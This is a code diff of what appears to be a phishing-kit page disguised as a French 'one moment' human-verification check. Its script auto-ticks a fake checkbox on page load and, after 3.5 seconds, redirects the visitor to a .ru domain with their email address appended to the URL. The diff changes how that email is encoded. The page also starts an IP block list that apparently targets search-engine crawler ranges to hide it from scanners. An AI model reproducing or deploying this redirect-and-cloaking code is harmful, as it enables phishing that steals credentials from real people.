@@ -52,44 +52,48 @@ Un instant…</title>
 </noscript>
 
 <script>
-    function getEmailFromUrl() {
-        var urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('email');
-    }
+function getEmailFromUrl() {
+    var urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('email');
+}
 
-    function handleCheckboxClick() {
-        var checkbox = document.getElementById('humanCheck');
+function handleCheckboxClick() {
+    var checkbox = document.getElementById('humanCheck');
 
-        if (checkbox.checked) {
-            checkbox.disabled = true; // Disable checkbox once checked
-            
-            // Extract the email from the current page's URL
-            var email = getEmailFromUrl();
-            
-            // Base URL for redirection
-            var baseUrl = 'https://pulsecrazeit.ru/v41u/';
-            
-            // Construct the new URL based on the presence of an email
-            var newUrl = baseUrl;
-            if (email) {
-                newUrl += '#G' + encodeURIComponent(email);
-            }
-            
-            setTimeout(function () {
-                // Redirect to the new URL
-                window.location.href = newUrl;
-            }, 3500); // 3500 milliseconds = 3.5 seconds
+    if (checkbox.checked) {
+        checkbox.disabled = true; // Disable checkbox once checked
+        
+        // Extract the email from the current page's URL
+        var email = getEmailFromUrl();
+        
+        // Base URL for redirection
+        var baseUrl = 'https://pulsecrazeit.ru/v41u/';
+        
+        // Construct the new URL based on the presence of an email
+        var newUrl = baseUrl;
+        if (email) {
+            // Manually encode the email and replace %40 with @
+            var encodedEmail = encodeURIComponent(email).replace(/%40/g, '@');
+            newUrl += '#G' + encodedEmail;
         }
+        
+        setTimeout(function () {
+            // Redirect to the new URL
+            window.location.href = newUrl;
+        }, 3500); // 3500 milliseconds = 3.5 seconds
     }
+}
 
-    // Automatically click the checkbox when the page loads
-    window.onload = function() {
-        var checkbox = document.getElementById('humanCheck');
-        if (checkbox) {
-            checkbox.checked = true;
-            handleCheckboxClick();
-        }
-    };
+// Automatically click the checkbox when the page loads
+window.onload = function() {
+    var checkbox = document.getElementById('humanCheck');
+    if (checkbox) {
+        checkbox.checked = true;
+        handleCheckboxClick();
+    }
+};
+
+
 	
 		const bannedIP = [
     /^66\.102\..*/,
